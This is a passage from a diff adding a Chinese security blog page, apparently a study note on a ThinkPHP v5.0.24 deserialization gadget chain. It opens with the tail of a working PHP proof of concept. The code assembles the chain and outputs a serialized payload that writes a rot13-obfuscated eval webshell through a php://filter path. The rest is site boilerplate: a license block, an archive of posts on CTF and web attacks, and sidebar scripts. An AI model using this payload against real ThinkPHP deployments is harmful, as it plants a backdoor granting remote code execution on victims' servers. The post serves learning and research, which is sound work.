&#x3D;&gt; false,</span><br><span class="line">                &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">                &#39;path&#39;  &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;&lt;?cuc @riny($_TRG[_]);?&gt;&#39;,</span><br><span class="line">                &#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">            ];</span><br><span class="line">            $this-&gt;tag &#x3D; &#39;xxx&#39;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $Memcached &#x3D; new think\session\driver\Memcached(new \think\cache\driver\File());</span><br><span class="line">    $Output &#x3D; new think\console\Output($Memcached);</span><br><span class="line">    $model &#x3D; new think\db\Query($Output);</span><br><span class="line">    $HasOne &#x3D; new think\model\relation\HasOne($model);</span><br><span class="line">    $window &#x3D; new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));</span><br><span class="line">    echo urlencode(serialize($window));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/196364" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://github.com/Jiang-Niao/Jiang-Niao.github.io">JiangNiao</a>
+            <p>原文链接：<a href="https://github.com/Jiang-Niao/Jiang-Niao.github.io/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">https://github.com/Jiang-Niao/Jiang-Niao.github.io/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</a>
+            <p>发表日期：<a href="https://github.com/Jiang-Niao/Jiang-Niao.github.io/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">February 8th 2021, 4:08:54 pm</a>
+            <p>更新日期：<a href="https://github.com/Jiang-Niao/Jiang-Niao.github.io/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">February 18th 2021, 11:23:15 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/02/08/php%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title= "php中的危险函数">
+                    <div class="nextTitle">php中的危险函数</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/12/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/" title= "操作系统笔记">
+                    <div class="prevTitle">操作系统笔记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:jiangniao66@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/Jiang-Niao" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TP-v5-0-24-反序列化链"><span class="toc-number">1.</span> <span class="toc-text">TP v5.0.24 反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#前要知识点"><span class="toc-number">1.1.</span> <span class="toc-text">前要知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pop链"><span class="toc-number">1.2.</span> <span class="toc-text">pop链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-number">1.3.</span> <span class="toc-text">poc</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 35
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/24/PHP%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" >php反序列化字符逃逸</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/08</span><a class="archive-post-title" href= "/2021/02/08/php%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" >php中的危险函数</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2020/12/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0/" >操作系统笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/13</span><a class="archive-post-title" href= "/2020/11/13/UNCTF%20%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" >UNCTF 出题笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AFweb/" >2020强网杯web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href= "/2020/05/21/p%E7%A5%9EBash%20Curl%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5%E7%90%86%E8%A7%A3/" >p神Bash Curl参数注入理解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href= "/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/" >安恒月赛四月web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2020/04/02/%E5%A6%82%E4%BD%95%E4%BB%8E%E6%A0%B9%E6%9C%AC%E8%A7%A3%E5%86%B3hexo%E4%B8%8D%E5%85%BC%E5%AE%B9%E6%A0%87%E7%AD%BE%E9%97%AE%E9%A2%98/" >如何从根本解决hexo不兼容标签问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2020/04/02/SSTi%20%E5%85%A8%E8%A7%A3%E6%9E%90/" >SSTi 学习(持续待更新)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href= "/2020/03/27/MRCTF-web/" >MRCTF部分web</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href= "/2019/12/08/sqli-labs%E7%BB%83%E4%B9%A0/" >sqli-labs练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2019/11/12/UNCTF%E5%AE%89%E6%81%92%E5%A4%8D%E7%8E%B0/" >UNCTF的赛后复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/2019/11/04/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" >堆叠注入的简单学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/29</span><a class="archive-post-title" href= "/2019/10/29/RSA%E5%88%9D%E6%8E%A2/" >初识RSA （持续更新）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/2019/10/18/HCTF2018%20WarmUp%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/" >HCTF2018 （持续更新）</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/01/20/docker%E5%BB%BA%E7%AB%8Bphp+mysql+apache%E7%9A%84web%E7%8E%AF%E5%A2%83/" >docker建立php+mysql+apache的web环境</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/11/hello-world/" >在搭建博客的问题解决方案以及优化</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href= "/2020/08/21/2020ciscn%E5%88%9D%E8%B5%9B/" >2020ciscn初赛</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2019/09/11/sql%E6%B3%A8%E5%85%A5%E6%B5%85%E6%9E%90/" >sql注入浅析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span><a class="archive-post-title" href= "/2019/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >ctf中的php反序列化</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/06/11/python%E7%88%AC%E8%99%AB%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" >python爬虫简单学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href= "/2019/07/17/%E5%90%84%E7%A7%8D%E6%83%85%E5%86%B5%E5%8F%8D%E5%BC%B9shell/" >各种情况下反弹shell</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/07/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" >浅析文件上传</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/09/22/%E5%AF%86%E7%A0%81%E5%AD%A6/" >古典古典密码</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2020/04/24/%E4%BB%8Ectf%E9%A2%98%E7%9B%AE%E4%B8%AD%E5%AD%A6%E4%B9%A0xpath%E6%B3%A8%E5%85%A5/" >从ctf题目中学习xpath注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2020/03/14/%E6%B1%9F%E9%B8%9F2020.3%20awd%E8%AE%B0%E5%BD%95/" >2020.3 awd记录</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/10/18/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" >模版注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/28/CISCN%202019%E5%88%9D%E8%B5%9B/" >CISCN 2019初赛 Love Math</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/04/01/CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%20buu%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" >CISCN2019 华东南赛区 buu复现笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/04/03/CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BAbuu%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/" >CISCN2019 华北赛区 buu复现笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/03/13/updatexml()%E3%80%81extractvalue()%20%E6%8A%A5%E9%94%99%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/" >sql报错注入：extractvalue、updatexml</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/07/12/Java%E5%AD%A6%E4%B9%A0%E6%9C%89%E5%85%B3%E9%87%8D%E5%86%99%E5%92%8C%E9%87%8D%E8%BD%BD/" >Java学习有关重写和重载</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/04/03/%E4%BB%8Ectf%E4%B8%AD%E5%AD%A6%E4%B9%A0%E5%88%A9%E7%94%A8%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E7%9A%84SSRF+CRLF%E6%94%BB%E5%87%BB/" >从ctf中学习利用利用SoapClient类的SSRF+CRLF攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2020/11/13/%E6%8A%A4%E7%BD%91%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E6%80%BB%E7%BB%93/" >护网攻防演练总结</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2021/02/08/TP%20v5.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" >TP v5.0.24 反序列化链学习</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="入门"><span class="iconfont-archer">&#xe606;</span>入门</span>
+    
+        <span class="sidebar-tag-name" data-tags="WEB"><span class="iconfont-archer">&#xe606;</span>WEB</span>
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="web"><span class="iconfont-archer">&#xe60a;</span>web</span>
+    
+        <span class="sidebar-category-name" data-categories="crypto"><span class="iconfont-archer">&#xe60a;</span>crypto</span>
+    
+        <span class="sidebar-category-name" data-categories="docker"><span class="iconfont-archer">&#xe60a;</span>docker</span>
+    
+        <span class="sidebar-category-name" data-categories="awd"><span class="iconfont-archer">&#xe60a;</span>awd</span>
+    
+        <span class="sidebar-category-name" data-categories="awd/web"><span class="iconfont-archer">&#xe60a;</span>awd/web</span>
+    
+        <span class="sidebar-category-name" data-categories="WEB"><span class="iconfont-archer">&#xe60a;</span>WEB</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "JiangNiao"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
